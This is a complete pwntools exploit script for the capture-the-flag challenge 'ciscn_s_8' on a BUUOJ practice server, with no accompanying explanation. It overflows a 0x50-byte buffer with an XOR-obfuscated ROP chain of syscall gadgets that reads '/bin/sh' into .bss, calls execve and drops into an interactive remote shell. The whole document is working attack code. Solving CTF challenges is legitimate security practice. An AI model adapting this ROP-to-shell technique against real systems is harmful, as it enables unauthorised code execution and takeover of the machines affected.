from pwn import *

#p = process('./ciscn_s_8')
p = remote('node4.buuoj.cn', 28526)

#context.log_level = 'debug'
context.arch = 'amd64'

syscall_ret = 0x4751a5
pop_rdi_ret = 0x4006e6
pop_rsi_ret = 0x4040fe
pop_rax_ret = 0x449b9c
pop_rdx_ret = 0x44c156

bss = 0x6BCED0

def x64(n):
    return bytearray([i ^ 0x66 for i in p64(n)])

payload = b'a' * ( 0x50 ) + x64(pop_rax_ret) + x64(0)
payload += x64(pop_rdi_ret) + x64(0)
payload += x64(pop_rsi_ret) + x64(bss)
payload += x64(pop_rdx_ret) + x64(8) + x64(syscall_ret)
payload += x64(pop_rdi_ret) + x64(bss)
payload += x64(pop_rsi_ret) + x64(0)
payload += x64(pop_rdx_ret) + x64(0)
payload += x64(pop_rax_ret) + x64(59) + x64(syscall_ret)

p.sendafter(b'Password', payload)

sleep(1)

p.send(b'/bin/sh\x00')

p.interactive()